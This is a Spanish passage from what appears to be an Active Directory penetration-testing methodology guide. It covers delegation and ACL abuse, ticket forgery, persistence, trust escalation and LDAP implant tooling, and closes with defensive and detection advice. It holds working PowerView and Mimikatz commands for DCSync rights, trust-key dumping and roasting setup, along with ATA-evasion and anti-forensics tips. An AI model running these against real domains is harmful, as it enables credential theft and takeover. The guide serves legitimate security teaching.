Si encuentras cualquier objeto Computer con el atributo [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) y tienes privilegios de dominio en el equipo, podrás volcar desde la memoria los TGT de todos los usuarios que inicien sesión en el equipo.\
Por lo tanto, si un **Domain Admin inicia sesión en el equipo**, podrás volcar su TGT e impersonarlo utilizando [Pass the Ticket](pass-the-ticket.md).\
Gracias a constrained delegation, incluso podrías **comprometer automáticamente un Print Server** (con suerte, será un DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Si un usuario o equipo está autorizado para "Constrained Delegation", podrá **impersonar a cualquier usuario para acceder a determinados servicios de un equipo**.\
Por lo tanto, si **comprometes el hash** de este usuario/equipo, podrás **impersonar a cualquier usuario** (incluso domain admins) para acceder a determinados servicios.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Tener privilegios de **WRITE** sobre un objeto de Active Directory de un equipo remoto permite obtener ejecución de código con **privilegios elevados**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Abuso de Permissions/ACLs

El usuario comprometido podría tener algunos **privilegios interesantes sobre ciertos objetos del dominio** que te permitirían realizar **movimiento** lateral/**escalar** privilegios.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Abuso del servicio Printer Spooler

Descubrir un **servicio Spool escuchando** dentro del dominio puede **abusarse** para **obtener nuevas credenciales** y **escalar privilegios**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Abuso de sesiones de terceros

Si **otros usuarios** **acceden** a la máquina **comprometida**, es posible **recopilar credenciales de la memoria** e incluso **inyectar beacons en sus procesos** para impersonarlos.\
Normalmente, los usuarios accederán al sistema mediante RDP, así que aquí tienes cómo realizar un par de ataques contra sesiones RDP de terceros:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** proporciona un sistema para gestionar la **contraseña del Administrator local** en equipos unidos al dominio, garantizando que sea **aleatoria**, única y que se **cambie** con frecuencia. Estas contraseñas se almacenan en Active Directory y el acceso se controla mediante ACLs únicamente para los usuarios autorizados. Con permisos suficientes para acceder a estas contraseñas, es posible pivotar a otros equipos.


{{#ref}}
laps.md
{{#endref}}

### Robo de certificados

**Recopilar certificados** de la máquina comprometida podría ser una forma de escalar privilegios dentro del entorno:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Abuso de Certificate Templates

Si hay **plantillas vulnerables** configuradas, es posible abusar de ellas para escalar privilegios:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation con una cuenta de altos privilegios

### Volcado de credenciales del dominio

Una vez que obtengas privilegios de **Domain Admin** o, mejor aún, de **Enterprise Admin**, puedes **volcar** la **base de datos del dominio**: _ntds.dit_.

[**Puedes encontrar más información sobre el ataque DCSync aquí**](dcsync.md).

[**Puedes encontrar más información sobre cómo robar NTDS.dit aquí**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

Algunas de las técnicas mencionadas anteriormente pueden utilizarse para la persistencia.\
Por ejemplo, podrías:

- Hacer que los usuarios sean vulnerables a [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Hacer que los usuarios sean vulnerables a [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Otorgar privilegios de [**DCSync**](#dcsync) a un usuario

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

El **ataque Silver Ticket** crea un **ticket legítimo de Ticket Granting Service (TGS)** para un servicio específico utilizando el **hash NTLM** (por ejemplo, el **hash de la cuenta del equipo**). Este método se utiliza para **acceder a los privilegios del servicio**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

Un **ataque Golden Ticket** consiste en que un atacante obtiene acceso al **hash NTLM de la cuenta krbtgt** en un entorno de Active Directory (AD). Esta cuenta es especial porque se utiliza para firmar todos los **Ticket Granting Tickets (TGTs)**, que son esenciales para autenticarse dentro de la red de AD.

Una vez que el atacante obtiene este hash, puede crear **TGTs** para cualquier cuenta que elija (ataque Silver ticket).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Son similares a los golden tickets, pero forjados de una forma que **evita los mecanismos comunes de detección de golden tickets.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Persistencia de la cuenta mediante Certificates**

**Tener certificados de una cuenta o poder solicitarlos** es una forma muy eficaz de mantener la persistencia en la cuenta del usuario (incluso si cambia la contraseña):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Persistencia en el dominio mediante Certificates**

**El uso de certificados también permite mantener la persistencia con altos privilegios dentro del dominio:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### Grupo AdminSDHolder

El objeto **AdminSDHolder** de Active Directory garantiza la seguridad de los **grupos privilegiados** (como Domain Admins y Enterprise Admins) aplicando una **Access Control List (ACL)** estándar a estos grupos para evitar cambios no autorizados. Sin embargo, esta función puede explotarse: si un atacante modifica la ACL de AdminSDHolder para otorgar acceso total a un usuario normal, dicho usuario obtiene un amplio control sobre todos los grupos privilegiados. Por tanto, esta medida de seguridad, diseñada para proteger, puede resultar contraproducente y permitir accesos no autorizados si no se supervisa cuidadosamente.

[**Puedes encontrar más información sobre el grupo AdminDSHolder aquí.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### Credenciales DSRM

Dentro de cada **Domain Controller (DC)** existe una cuenta de **administrador local**. Al obtener derechos de administrador en una máquina de este tipo, el hash del Administrator local puede extraerse utilizando **mimikatz**. Después, es necesario modificar el registro para **habilitar el uso de esta contraseña**, lo que permite el acceso remoto a la cuenta Administrator local.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### Persistencia mediante ACL

Podrías **otorgar** ciertos **permisos especiales** a un **usuario** sobre determinados objetos del dominio, lo que permitiría al usuario **escalar privilegios en el futuro**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

Los **security descriptors** se utilizan para **almacenar** los **permisos** que un **objeto** tiene **sobre** otro **objeto**. Si puedes realizar un **pequeño cambio** en el **security descriptor** de un objeto, puedes obtener privilegios muy interesantes sobre dicho objeto sin necesidad de pertenecer a un grupo privilegiado.


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

Abusa de la clase auxiliar `dynamicObject` para crear principals/GPOs/registros DNS de corta duración con `entryTTL`/`msDS-Entry-Time-To-Die`; se eliminan automáticamente sin tombstones, borrando las evidencias LDAP mientras dejan SIDs huérfanos, referencias `gPLink` rotas o respuestas DNS almacenadas en caché (por ejemplo, contaminación de ACEs de AdminSDHolder o redirecciones maliciosas mediante `gPCFileSysPath`/DNS integrado en AD).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Alterar **LSASS** en memoria para establecer una **contraseña universal**, otorgando acceso a todas las cuentas del dominio.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Aprende aquí qué es un SSP (Security Support Provider).](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Puedes crear tu **propio SSP** para **capturar** en **texto claro** las **credenciales** utilizadas para acceder a la máquina.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Registra un **nuevo Domain Controller** en AD y lo utiliza para **modificar atributos** (SIDHistory, SPNs...) en objetos especificados **sin dejar ningún **log** sobre las **modificaciones**. Necesitas privilegios de DA y estar dentro del **root domain**.\
Ten en cuenta que, si utilizas datos incorrectos, aparecerán logs bastante comprometedores.


{{#ref}}
dcshadow.md
{{#endref}}

### Persistencia mediante LAPS

Anteriormente hemos explicado cómo escalar privilegios si tienes **permisos suficientes para leer las contraseñas de LAPS**. Sin embargo, estas contraseñas también pueden utilizarse para **mantener la persistencia**.\
Consulta:


{{#ref}}
laps.md
{{#endref}}

## Escalada de privilegios en el Forest - Domain Trusts

Microsoft considera el **Forest** como el límite de seguridad. Esto implica que **comprometer un único dominio podría conducir potencialmente al compromiso de todo el Forest**.<sup>[[1]](#references)</sup>

### Información básica

Un [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) es un mecanismo de seguridad que permite a un usuario de un **dominio** acceder a recursos de otro **dominio**. Básicamente, crea una conexión entre los sistemas de autenticación de ambos dominios, permitiendo que las verificaciones de autenticación fluyan sin problemas. Cuando los dominios establecen una relación de confianza, intercambian y conservan **keys** específicas dentro de sus **Domain Controllers (DCs)**, que son fundamentales para la integridad de la relación de confianza.

En un escenario típico, si un usuario desea acceder a un servicio de un **trusted domain**, primero debe solicitar un ticket especial conocido como **inter-realm TGT** al DC de su propio dominio. Este TGT se cifra con una **key** compartida que ambos dominios han acordado. A continuación, el usuario presenta este TGT al **DC del trusted domain** para obtener un ticket de servicio (**TGS**). Una vez que el DC del trusted domain valida correctamente el inter-realm TGT, emite un TGS que permite al usuario acceder al servicio.

**Pasos**:

1. Un **client computer** del **Domain 1** inicia el proceso utilizando su **hash NTLM** para solicitar un **Ticket Granting Ticket (TGT)** a su **Domain Controller (DC1)**.
2. DC1 emite un nuevo TGT si el cliente se autentica correctamente.
3. El cliente solicita entonces un **inter-realm TGT** a DC1, necesario para acceder a recursos del **Domain 2**.
4. El inter-realm TGT se cifra con una **trust key** compartida entre DC1 y DC2 como parte de la relación de confianza bidireccional entre los dominios.
5. El cliente lleva el inter-realm TGT al **Domain Controller (DC2) del Domain 2**.
6. DC2 verifica el inter-realm TGT mediante su trust key compartida y, si es válido, emite un **Ticket Granting Service (TGS)** para el servidor del Domain 2 al que el cliente desea acceder.
7. Finalmente, el cliente presenta este TGS al servidor, que está cifrado con el hash de la cuenta del servidor, para obtener acceso al servicio del Domain 2.

### Diferentes trusts

Es importante observar que **un trust puede ser unidireccional o bidireccional**. En las opciones bidireccionales, ambos dominios confían el uno en el otro, pero en la relación de confianza **unidireccional**, uno de los dominios será el **trusted** y el otro el dominio **trusting**. En este último caso, **solo podrás acceder a recursos dentro del trusting domain desde el trusted**.

Si el Domain A confía en el Domain B, A es el trusting domain y B es el trusted. Además, en el **Domain A**, esto sería un **Outbound trust**; y en el **Domain B**, sería un **Inbound trust**.

**Diferentes relaciones de confianza**

- **Parent-Child Trusts**: Es una configuración común dentro del mismo forest, donde un child domain tiene automáticamente una relación de confianza transitiva y bidireccional con su parent domain. Básicamente, esto significa que las solicitudes de autenticación pueden fluir sin problemas entre el parent y el child.
- **Cross-link Trusts**: Conocidas como "shortcut trusts", se establecen entre child domains para acelerar los procesos de referral. En forests complejos, las referencias de autenticación normalmente deben subir hasta el forest root y después bajar hasta el dominio objetivo. Al crear cross-links, se acorta el recorrido, lo que resulta especialmente beneficioso en entornos geográficamente dispersos.
- **External Trusts**: Se configuran entre dominios diferentes y no relacionados, y por naturaleza no son transitivas. Según la [documentación de Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), los external trusts son útiles para acceder a recursos de un dominio fuera del forest actual que no está conectado mediante un forest trust. La seguridad se refuerza mediante SID filtering con external trusts.
- **Tree-root Trusts**: Estas relaciones se establecen automáticamente entre el forest root domain y un nuevo tree root. Aunque no son habituales, los tree-root trusts son importantes para añadir nuevos árboles de dominio a un forest, permitiéndoles mantener un nombre de dominio único y garantizando la transitividad bidireccional. Puedes encontrar más información en la [guía de Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Este tipo de relación es un trust transitivo y bidireccional entre dos forest root domains, y también aplica SID filtering para mejorar las medidas de seguridad.
- **MIT Trusts**: Estas relaciones se establecen con dominios Kerberos que no son Windows y cumplen con [RFC4120](https://tools.ietf.org/html/rfc4120). Los MIT trusts son algo más especializados y están destinados a entornos que requieren integración con sistemas basados en Kerberos fuera del ecosistema Windows.

#### Otras diferencias en las **relaciones trusting**

- Una relación de confianza también puede ser **transitiva** (A confía en B, B confía en C, entonces A confía en C) o **no transitiva**.
- Una relación de confianza puede configurarse como **bidirectional trust** (ambos confían el uno en el otro) o **one-way trust** (solo uno de ellos confía en el otro).

### Attack Path

1. **Enumerar** las relaciones de confianza
2. Comprobar si algún **security principal** (usuario/grupo/equipo) tiene **acceso** a recursos del **otro dominio**, quizá mediante entradas ACE o por pertenecer a grupos del otro dominio. Busca **relaciones entre dominios** (probablemente el trust se creó para esto).
1. kerberoast en este caso podría ser otra opción.
3. **Comprometer** las **cuentas** que pueden **pivotar** entre dominios.

Los atacantes podrían acceder a recursos de otro dominio mediante tres mecanismos principales:

- **Local Group Membership**: Los principals podrían añadirse a grupos locales de máquinas, como el grupo “Administrators” de un servidor, lo que les otorgaría un control considerable sobre esa máquina.
- **Foreign Domain Group Membership**: Los principals también pueden ser miembros de grupos dentro del dominio externo. Sin embargo, la eficacia de este método depende de la naturaleza del trust y del ámbito del grupo.
- **Access Control Lists (ACLs)**: Los principals podrían especificarse en una **ACL**, especialmente como entidades en **ACEs** dentro de una **DACL**, proporcionándoles acceso a recursos específicos. Para quienes deseen profundizar en el funcionamiento de las ACLs, DACLs y ACEs, el whitepaper titulado “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” es un recurso inestimable.<sup>[[17]](#references)</sup>

### Buscar usuarios/grupos externos con permisos

Puedes comprobar **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** para encontrar principals de seguridad externos en el dominio. Estos serán usuarios/grupos de **un dominio/forest externo**.

Puedes comprobarlo en **Bloodhound** o utilizando powerview:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Escalada de privilegios de Child a Parent en un forest
```bash
# From PowerView
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Otras formas de enumerar las confianzas del dominio:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Hay **2 trusted keys**, una para _Child --> Parent_ y otra para _Parent_ --> _Child_.\
> Puedes obtener la que utiliza el dominio actual con:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Escala a Enterprise admin en el dominio child/parent abusando de la trust mediante SID-History injection:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Explotar la Configuration NC escribible

Comprender cómo se puede explotar la Configuration Naming Context (NC) es crucial. La Configuration NC actúa como repositorio central de los datos de configuración en un forest en entornos de Active Directory (AD). Estos datos se replican en todos los Domain Controller (DC) del forest, y los DC escribibles mantienen una copia escribible de la Configuration NC. Para explotar esto, es necesario tener **privilegios SYSTEM en un DC**, preferiblemente un child DC.

**Vincular una GPO al sitio del DC root**

El contenedor Sites de la Configuration NC incluye información sobre los sitios de todos los equipos unidos al dominio dentro del forest de AD. Al operar con privilegios SYSTEM en cualquier DC, los atacantes pueden vincular GPOs a los sitios de los DC root. Esta acción puede comprometer el dominio root al manipular las políticas aplicadas a estos sitios.

Para obtener información detallada, se puede consultar la investigación sobre [Bypassing SID Filtering](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4).<sup>[[12]](#references)</sup>

**Comprometer cualquier gMSA del forest**

Un vector de ataque consiste en atacar gMSAs privilegiadas dentro del dominio. La KDS Root key, esencial para calcular las contraseñas de las gMSAs, se almacena en la Configuration NC. Con privilegios SYSTEM en cualquier DC, es posible acceder a la KDS Root key y calcular las contraseñas de cualquier gMSA en todo el forest.

Se puede encontrar un análisis detallado y una guía paso a paso en:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Ataque complementario contra MSA delegadas (BadSuccessor – abusando de los atributos de migración):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Investigación externa adicional: [Golden gMSA Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5).<sup>[[13]](#references)</sup>

**Ataque de modificación del Schema**

Este método requiere paciencia y esperar a que se creen nuevos objetos de AD privilegiados. Con privilegios SYSTEM, un atacante puede modificar el AD Schema para otorgar a cualquier usuario control total sobre todas las clases. Esto podría provocar acceso y control no autorizados sobre los objetos de AD creados posteriormente.

Se puede obtener más información en [Schema Change Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6).<sup>[[14]](#references)</sup>

**De DA a EA con ADCS ESC5**

La vulnerabilidad ADCS ESC5 tiene como objetivo obtener el control sobre los objetos de Public Key Infrastructure (PKI) para crear una certificate template que permita autenticarse como cualquier usuario dentro del forest. Como los objetos PKI se encuentran en la Configuration NC, comprometer un child DC escribible permite ejecutar ataques ESC5.

Se pueden consultar más detalles en [From DA to EA with ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/).<sup>[[15]](#references)</sup> En escenarios sin ADCS, el atacante puede configurar los componentes necesarios, tal como se explica en [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).<sup>[[16]](#references)</sup>

### Dominio de un Forest externo - Unidireccional (Inbound) o bidireccional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
En este escenario, **tu dominio es de confianza** para otro externo que te concede **permisos indeterminados** sobre él. Tendrás que encontrar **qué principales de tu dominio tienen qué acceso al dominio externo** y después intentar explotarlo:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Dominio de bosque externo - Unidireccional (saliente)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
En este escenario, **tu dominio** está **confiando** algunos **privilegios** a un principal de **otros dominios**.

Sin embargo, cuando un **dominio es de confianza** para el dominio que confía, el dominio de confianza **crea un usuario** con un **nombre predecible** que utiliza como **contraseña la contraseña de confianza**. Esto significa que es posible **acceder a un usuario del dominio que confía para entrar en el de confianza**, enumerarlo e intentar escalar más privilegios:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Otra forma de comprometer el dominio de confianza es encontrar un [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) creado en la **dirección opuesta** a la de la confianza de dominio (lo cual no es muy común).

Otra forma de comprometer el dominio de confianza es esperar en una máquina donde un **usuario del dominio de confianza pueda acceder** para iniciar sesión mediante **RDP**. Después, el atacante podría inyectar código en el proceso de la sesión RDP y **acceder al dominio de origen de la víctima** desde allí.\
Además, si la **víctima montó su disco duro**, el atacante podría utilizar el proceso de la **sesión RDP** para almacenar **backdoors** en la **carpeta de inicio del disco duro**. Esta técnica se denomina **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Mitigación del abuso de la confianza de dominio

### **SID Filtering:**

- El riesgo de los ataques que aprovechan el atributo SID history entre forest trusts se mitiga mediante SID Filtering, que está activado de forma predeterminada en todas las confianzas entre forests. Esto se basa en la suposición de que las confianzas dentro de un forest son seguras, considerando el forest, en lugar del dominio, como el límite de seguridad, conforme a la postura de Microsoft.
- Sin embargo, existe un inconveniente: SID filtering puede interrumpir aplicaciones y el acceso de los usuarios, lo que provoca que se desactive ocasionalmente.

### **Selective Authentication:**

- En las confianzas entre forests, el uso de Selective Authentication garantiza que los usuarios de los dos forests no se autentiquen automáticamente. En su lugar, se requieren permisos explícitos para que los usuarios accedan a dominios y servidores dentro del dominio o forest que confía.
- Es importante tener en cuenta que estas medidas no protegen contra la explotación del Writable Configuration Naming Context (NC) ni contra ataques a la cuenta de confianza.

[**Más información sobre las confianzas de dominio en ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)<sup>[[3]](#references)</sup>

## Abuso de AD basado en LDAP desde implants en el host

La [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) vuelve a implementar primitivas LDAP al estilo de bloodyAD como Beacon Object Files x64 que se ejecutan completamente dentro de un implant en el host (por ejemplo, Adaptix C2). Los operadores compilan el paquete con `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, cargan `ldap.axs` y, a continuación, ejecutan `ldap <subcommand>` desde el beacon. Todo el tráfico utiliza el contexto de seguridad del inicio de sesión actual mediante LDAP (389) con signing/sealing o LDAPS (636) con confianza automática en el certificado, por lo que no se necesitan proxies socks ni artefactos en disco.<sup>[[4]](#references)</sup>

### Enumeración LDAP desde el implant

- `get-users`, `get-computers`, `get-groups`, `get-usergroups` y `get-groupmembers` resuelven nombres cortos/rutas de OU en DNs completos y extraen los objetos correspondientes.
- `get-object`, `get-attribute` y `get-domaininfo` extraen atributos arbitrarios (incluidos descriptores de seguridad), además de los metadatos del forest/dominio desde `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation` y `get-rbcd` muestran candidatos para roasting, configuraciones de delegación y descriptores existentes de [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) directamente desde LDAP.
- `get-acl` y `get-writable --detailed` analizan la DACL para enumerar trustees, derechos (GenericAll/WriteDACL/WriteOwner/escrituras de atributos) y herencia, proporcionando objetivos inmediatos para la escalada de privilegios mediante ACL.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### Primitivas de escritura LDAP para escalada y persistencia

- Los BOF de creación de objetos (`add-user`, `add-computer`, `add-group`, `add-ou`) permiten al operador preparar nuevos principals o cuentas de máquina dondequiera que existan permisos sobre la OU. `add-groupmember`, `set-password`, `add-attribute` y `set-attribute` secuestran directamente los objetivos una vez encontrados permisos de escritura de propiedades.
- Los comandos centrados en ACL, como `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite` y `add-dcsync`, convierten WriteDACL/WriteOwner sobre cualquier objeto de AD en restablecimientos de contraseñas, control de pertenencia a grupos o privilegios de replicación DCSync sin dejar artefactos de PowerShell/ADSI. Las contrapartes `remove-*` limpian los ACE inyectados.

### Delegación, roasting y abuso de Kerberos

- `add-spn`/`set-spn` convierten al instante a un usuario comprometido en un objetivo de Kerberoast; `add-asreproastable` (conmutador UAC) lo marca para AS-REP roasting sin tocar la contraseña.
- Las macros de delegación (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) reescriben `msDS-AllowedToDelegateTo`, las flags de UAC o `msDS-AllowedToActOnBehalfOfOtherIdentity` desde el beacon, habilitando rutas de ataque de delegación constrained/unconstrained/RBCD y eliminando la necesidad de PowerShell remoto o RSAT.

### Inyección de sidHistory, reubicación de OUs y configuración de la superficie de ataque

- `add-sidhistory` inyecta SIDs privilegiados en el historial de SID de un principal controlado (consulta [SID-History Injection](sid-history-injection.md)), proporcionando una herencia de acceso sigilosa completamente mediante LDAP/LDAPS.
- `move-object` cambia el DN/OU de equipos o usuarios, permitiendo que un atacante arrastre activos a OUs donde ya existen derechos delegados antes de abusar de `set-password`, `add-groupmember` o `add-spn`.
- Los comandos de eliminación con alcance limitado (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, etc.) permiten revertir rápidamente los cambios después de que el operador recopile credenciales o establezca persistencia, minimizando la telemetría.

## AD -> Azure y Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Algunas defensas generales

[**Obtén más información sobre cómo proteger las credenciales aquí.**](../stealing-credentials/credentials-protections.md)

### **Medidas defensivas para la protección de credenciales**

- **Restricciones para Domain Admins**: Se recomienda que Domain Admins solo puedan iniciar sesión en Domain Controllers, evitando su uso en otros hosts.
- **Privilegios de las cuentas de servicio**: Los servicios no deben ejecutarse con privilegios de Domain Admin (DA) para mantener la seguridad.
- **Limitación temporal de privilegios**: Para las tareas que requieran privilegios de DA, su duración debe limitarse. Esto puede lograrse mediante: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **Mitigación de LDAP relay**: Audita los Event IDs 2889/3074/3075 y luego aplica la firma LDAP y el channel binding de LDAPS en DCs/clientes para bloquear intentos de MITM/relay de LDAP.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Fingerprinting a nivel de protocolo de la actividad de Impacket

Si quieres detectar tradecraft común de AD, **no dependas únicamente de artefactos controlados por el operador**, como binarios renombrados, nombres de servicios, archivos batch temporales o rutas de salida. Establece una baseline de cómo los clientes legítimos de Windows construyen el tráfico de [Kerberos](kerberos-authentication.md), [NTLM](../ntlm/README.md), SMB, LDAP, DCE/RPC y WMI, y luego busca **anomalías de implementación** que permanezcan incluso después de que el operador edite `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py` o `ntlmrelayx.py`.<sup>[[8]](#references)</sup>

- **Candidatos independientes de alta confianza** (después de validarlos con tu propia baseline):
- DCE/RPC autenticado mediante `auth_context_id = 79231 + ctx_id`
- Relleno de autenticación de DCE/RPC completado con `0xff`
- Binds de Kerberos en LDAP que colocan un `AP-REQ` de Kerberos sin procesar directamente en `mechToken` de SPNEGO
- Solicitudes de negociación SMB2/3 con valores de `ClientGuid` de apariencia ASCII
- `IWbemLevel1Login::NTLMLogin` de WMI usando el namespace no estándar `//./root/cimv2`
- Valores nonce de Kerberos hardcodeados
- **Más adecuados como features de correlación/puntuación**:
- Listas de etypes de Kerberos escasas o duplicadas, `PA-DATA` inusual/ausente u orden de etypes en TGS-REQ diferente al de Windows nativo
- Mensajes NTLM Type 1 sin información de versión o mensajes Type 3 con nombres de host nulos
- NTLMSSP sin procesar transportado en DCE/RPC en lugar de SPNEGO, ausencia de trailers de verificación de DCE/RPC o discrepancias de OID entre SPNEGO/Kerberos
- Varios de estos rasgos procedentes del mismo host/usuario/sesión/intervalo temporal son mucho más sólidos que cualquier campo débil individual
- **Usar como enriquecimiento, no como alertas independientes**:
- Nombres de archivo predeterminados, rutas de salida, nombres de servicios aleatorios, nombres de batch temporales, nombres de cuentas de equipo predeterminados y cadenas HTTP/WebDAV/RDP/MSSQL específicas de la herramienta
- Son fáciles de cambiar para los operadores y es mejor usarlos para explicar por qué un clúster entre protocolos resulta sospechoso
- **Notas operativas**:
- Algunas de estas señales requieren tráfico descifrado, análisis de [PCAP/Zeek](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md), ETW o visibilidad del lado del servicio
- Valida la actividad frente a clientes Samba/Linux, appliances y software heredado antes de convertirla en alertas
- Promueve las detecciones de enriquecimiento -> hunting -> alertas a medida que aumente la confianza en la baseline

### **Implementación de técnicas de deception**

- La implementación de deception implica establecer trampas, como usuarios o equipos señuelo, con características como contraseñas que no caducan o que están marcadas como Trusted for Delegation. Un enfoque detallado incluye crear usuarios con derechos específicos o añadirlos a grupos con altos privilegios.<sup>[[2]](#references)</sup>
- Un ejemplo práctico consiste en usar herramientas como: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Puedes encontrar más información sobre el despliegue de técnicas de deception en [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Identificación de deception**

- **Para objetos de usuario**: Los indicadores sospechosos incluyen un ObjectSID atípico, inicios de sesión poco frecuentes, fechas de creación y un número bajo de contraseñas incorrectas.
- **Indicadores generales**: Comparar los atributos de posibles objetos señuelo con los de objetos auténticos puede revelar inconsistencias. Herramientas como [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) pueden ayudar a identificar este tipo de deception.

### **Evasión de sistemas de detección**

- **Evasión de la detección de Microsoft ATA**:
- **Enumeración de usuarios**: Evita la enumeración de sesiones en Domain Controllers para impedir la detección por parte de ATA.
- **Suplantación mediante tickets**: Utilizar claves **aes** para crear tickets ayuda a evadir la detección al no degradar a NTLM.
- **Ataques DCSync**: Se recomienda ejecutarlos desde un equipo que no sea un Domain Controller para evitar la detección de ATA, ya que la ejecución directa desde un Domain Controller activará alertas.

## References

- [1] [Guía para atacar las relaciones de confianza de dominio](https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/)
- [2] [Forjando relaciones de confianza para deception en Active Directory](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
